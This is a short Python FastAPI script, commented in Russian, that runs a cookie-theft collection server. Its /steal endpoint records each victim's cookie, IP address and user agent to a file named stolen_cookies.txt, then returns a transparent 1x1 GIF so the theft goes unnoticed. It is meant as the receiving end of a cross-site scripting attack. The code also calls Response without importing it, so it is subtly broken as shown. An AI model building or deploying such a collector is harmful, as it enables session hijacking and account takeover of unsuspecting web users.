from fastapi import FastAPI, Request
import uvicorn
from datetime import datetime

app = FastAPI()

# Логируем все запросы в файл stolen_cookies.txt
LOG_FILE = "stolen_cookies.txt"

@app.get("/")
async def root():
    return {"status": "Server is running. Use /steal endpoint."}

@app.get("/steal")
async def steal_cookie(request: Request):
    # Получаем все параметры из запроса
    params = dict(request.query_params)
    cookie = params.get("cookie", "no_cookie")
    user_agent = request.headers.get("user-agent", "unknown")
    ip = request.client.host if request.client else "unknown"
    timestamp = datetime.now().isoformat()

    log_entry = f"[{timestamp}] IP: {ip} | UA: {user_agent} | Cookie: {cookie}\n"
    
    # Пишем в файл
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    # Отдаём прозрачный 1x1 GIF, чтобы не было видно ошибки в браузере
    transparent_gif = (
        b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00'
        b'\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
        b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    )
    return Response(content=transparent_gif, media_type="image/gif")

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)